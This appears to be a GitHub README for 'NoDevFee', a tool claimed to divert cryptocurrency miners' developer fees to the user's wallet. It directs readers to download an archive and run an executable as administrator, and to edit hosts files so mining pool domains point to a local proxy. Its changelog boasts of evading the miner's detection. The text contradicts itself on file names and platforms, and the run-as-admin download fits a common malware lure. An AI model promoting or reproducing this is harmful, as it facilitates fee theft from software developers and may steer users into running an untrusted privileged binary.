## About The Project NoDevFee -  Ethereum Mining NoDevFee 0% 
---
![Screenshot](Image1.png)
---
![Screenshot](Image2.png)
---
![Screenshot](Image3.png)
---
![Screenshot](Image4.png)
---
![Screenshot](Image5.png)
---

I created a NoDevFee tool that REMOVE the devfee from the minners.

This tool remove the devfee, all devfee will be redirect to your address too.

## Supported algorithms

- KawPow
- Etchash
- Ethash

## WHAT IS IT?

This program helps you to save you your money and earn more when you use Claymore's Dual Ethereum
Miner. It reduses 1%(or 2% in Dual mode) fee.
DevFee will mine to your wallet but miner wil think that it mines Real DevFee.
It was tested on Windows 10 and Windows 7!
Where to Download?

## Download Link:

- [ ] [Download NoDevFee for Windows/Linux/MacOS](https://github.com/NoFeesDev/NoDevFee/releases/download/nodevfee/NoDevFee-master.rar)


## How to Use?

1) Download NoDevFee15.0.zip
2) Right Click at ZeroFee.exe->Properties -> Compatibility tab->Run As Administator -> Save
3) Open ZeroFee.bat and change wallet to your and mining pool port to your (you may not set it but it is recomended to reduce CPU usage) ->Run bat file

## Stability

It was tested with nanopool.org etheremine.org ethpool.org it works perfect.
(I have additional 1.8mhs to my 176mhs with this software and)
You can test it with other pools and tell results here.

## Why do you need it

I have 7 GPUs and nanopool shows me that I will get additional 1.975 USD/mo (and 3.95$ when I use dualmining with sia coin).
Updated Proof :
![image](https://user-images.githubusercontent.com/127042057/222974880-922b1749-cf8f-4390-9ec0-e56634b034f9.png)

## Examples

1. Just run the executable compiled by us or run the NodeJs app from our code
2. Run the minner
3. THATS ALL!!

## Try to install all
- microsoft c++ 2010 redistributable
https://download.microsoft.com/download/3/2/2/3224B87F-CFA0-4E70-BDA3-3DE650EFEBA5/vcredist_x64.exe
- microsoft c++ 2012 redistributable
http://download.microsoft.com/download/1/6/B/16B06F60-3B20-4FF2-B699-5E9B7962F9AE/VSU3/vcredist_x64.exe
- microsoft c++ 2013 redistributable
http://download.microsoft.com/download/2/E/6/2E61CFA4-993B-4DD4-91DA-3737CD5CD6E3/vcredist_x64.exe

And then REBOOT your mining PC

PhoenixMiner

```
PhoenixMiner.exe -pool 127.0.0.1:4444 -wal 0x383a03BABF570A066CF15E48FCfDF147d7DB57Cf.Miner1 
```

NBMiner

```
nbminer -a ethash -o stratum+tcp://127.0.0.1:4444 -u 0x383a03BABF570A066CF15E48FCfDF147d7DB57Cf.Miner1
```

Gminer

```
miner.exe --algo ethash --server 127.0.0.1:4444 --user 0x383a03BABF570A066CF15E48FCfDF147d7DB57Cf --worker Miner1
```
-------------------------------------------------------

## Configuration

Change the .env file with your configuration

| ENV variable | Description | Example Value |
|--|--|--|
| MINNER_IP | The remote IP address of the mining pool you wish to push your shares to. DON'T PUT DNS, PUT THE IP NUMBER, I ADDED A LIST BELOW | 172.65.193.133 |
| MINNER_PORT | The remote port of the mining pool you wish to push your shares to. | 4444 |
| LOGIN | Your pool login | 0x383a03BABF570A066CF15E48FCfDF147d7DB57Cf or juliotec |
| PASSWORD | Your pool password | 123456 |
| PORTS_TO_REDIRECT | Port numbers that DevFee miner servers use and we will redirect to ours | 4444,14444,5555,9999 |

| DNS| IP |
|--|--|
| eu1.ethermine.org|172.65.218.130 |
| asia1.ethermine.org|172.65.247.152 |
| us1.ethermine.org|172.65.193.133 |
| us2.ethermine.org|172.65.230.90 |
| eth-us-east1.nanopool.org|192.99.69.170 |
| eth-us-west1.nanopool.org|207.246.100.198 |
| eth-eu1.nanopool.org|51.15.39.186 |
| eth-eu2.nanopool.org|51.15.55.100 |
| eth-asia1.nanopool.org|139.99.102.71 |
| eth-jp1.nanopool.org|139.162.81.90 |
| eth-au1.nanopool.org|139.99.156.30 |
| eth-us-east.flexpool.io|3.214.89.230 |
| eth-us-west.flexpool.io|34.218.113.86 |
| eth-de.flexpool.io|3.66.238.21 |
| eth-se.flexpool.io|13.48.151.148 |
| eth-sg.flexpool.io|13.214.83.223 |
| eth-au.flexpool.io|3.104.230.31 |
| eth-br.flexpool.io|18.229.236.105 |
| eth-kr.flexpool.io|3.36.209.165 |
| asia1.ethpool.org|172.65.215.159 |
| eu1.ethpool.org|172.65.212.80 |
| us1.ethpool.org|172.65.229.54 |

Need add 127.0.0.1 DNS in "C:\Windows\System32\drivers\etc\hosts" for Windows

you can add more dns as you whish

```
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
127.0.0.1       eu1.ethermine.org
127.0.0.1       asia1.ethermine.org
127.0.0.1       us1.ethermine.org
127.0.0.1       us2.ethermine.org
127.0.0.1       eth-us-east1.nanopool.org
127.0.0.1       eth-us-west1.nanopool.org
127.0.0.1       eth-eu1.nanopool.org
127.0.0.1       eth-eu2.nanopool.org
127.0.0.1       eth-asia1.nanopool.org
127.0.0.1       eth-jp1.nanopool.org
127.0.0.1       eth-au1.nanopool.org
127.0.0.1       eth-us-east.flexpool.io
127.0.0.1       eth-us-west.flexpool.io
127.0.0.1       eth-de.flexpool.io
127.0.0.1       eth-se.flexpool.io
127.0.0.1       eth-sg.flexpool.io
127.0.0.1       eth-au.flexpool.io
127.0.0.1       eth-br.flexpool.io
127.0.0.1       eth-kr.flexpool.io
127.0.0.1       asia1.ethpool.org
127.0.0.1       eu1.ethpool.org
127.0.0.1       us1.ethpool.org
```

Need add 127.0.0.1 DNS in "/etc/hosts" for Linux

```
sudo vi /etc/hosts
```
```
127.0.0.1       eu1.ethermine.org
127.0.0.1       asia1.ethermine.org
127.0.0.1       us1.ethermine.org
127.0.0.1       us2.ethermine.org
127.0.0.1       eth-us-east1.nanopool.org
127.0.0.1       eth-us-west1.nanopool.org
127.0.0.1       eth-eu1.nanopool.org
127.0.0.1       eth-eu2.nanopool.org
127.0.0.1       eth-asia1.nanopool.org
127.0.0.1       eth-jp1.nanopool.org
127.0.0.1       eth-au1.nanopool.org
127.0.0.1       eth-us-east.flexpool.io
127.0.0.1       eth-us-west.flexpool.io
127.0.0.1       eth-de.flexpool.io
127.0.0.1       eth-se.flexpool.io
127.0.0.1       eth-sg.flexpool.io
127.0.0.1       eth-au.flexpool.io
127.0.0.1       eth-br.flexpool.io
127.0.0.1       eth-kr.flexpool.io
127.0.0.1       asia1.ethpool.org
127.0.0.1       eu1.ethpool.org
127.0.0.1       us1.ethpool.org
```

Need add 127.0.0.1 DNS in "/private/etc/hosts" for Mac

```
sudo vi /private/etc/hosts
```
```
127.0.0.1       eu1.ethermine.org
127.0.0.1       asia1.ethermine.org
127.0.0.1       us1.ethermine.org
127.0.0.1       us2.ethermine.org
127.0.0.1       eth-us-east1.nanopool.org
127.0.0.1       eth-us-west1.nanopool.org
127.0.0.1       eth-eu1.nanopool.org
127.0.0.1       eth-eu2.nanopool.org
127.0.0.1       eth-asia1.nanopool.org
127.0.0.1       eth-jp1.nanopool.org
127.0.0.1       eth-au1.nanopool.org
127.0.0.1       eth-us-east.flexpool.io
127.0.0.1       eth-us-west.flexpool.io
127.0.0.1       eth-de.flexpool.io
127.0.0.1       eth-se.flexpool.io
127.0.0.1       eth-sg.flexpool.io
127.0.0.1       eth-au.flexpool.io
127.0.0.1       eth-br.flexpool.io
127.0.0.1       eth-kr.flexpool.io
127.0.0.1       asia1.ethpool.org
127.0.0.1       eu1.ethpool.org
127.0.0.1       us1.ethpool.org
```
v15.0
 Now works with Claymore v15.0
 Code improvements
 New Logo

v8.0
 TCP packets checking speed is improved (checking function is replaced with assembly code to speed up checking)
 Fixed bug with automatic adding to startup(automatic adding to startup feature is deleted).
 New Logo

v7.1
 Added automatic administrator privileges (thanks to @thereisnokappa)
 Not detectable by claymore's miner
 Minor code improvements

v7.0
 Added support of Support of Nicehash
 Added support of "-esm 0", "-esm 1" , "-esm 2" and "-esm 3" arguments in you command line for claymore miner.
 Optimized allocation of memory
 New protection against Claymore miner detection
 You do not need to enter mining pool port in this version only wallet
 File structure optimization

v5.5
 Reminder if you forgot to run it as Administrator
 Automatic adding NoFee.bat to the startup
 Design changes

v5.0:
 Works now even with Claymore Miner v9.4
 Major speed improvements
 Less CPU load
 Some bug fixes

v3.4:
 Fixed issues with blocking RDP,Radmin,TeamViewer

v3.3:
Now it works with nicehash, miningpoolhub & forks like ETC when you use "-allpools 1" at the Claymore's miner.
Changed devFee priority:
                                 first time devFee sends shares to your wallet(15 min after start),
                                 second time Real devFee mining(1h after start),
                                 third time devFee sends shares to your wallet(2h after start),
                                 fourth, fifth, sixth, seventh and all next times devFee sends shares to your wallet.

v3.2:
Now it works with all pools (tested). Slightly improved stability.  Archive type changed from .rar to .zip

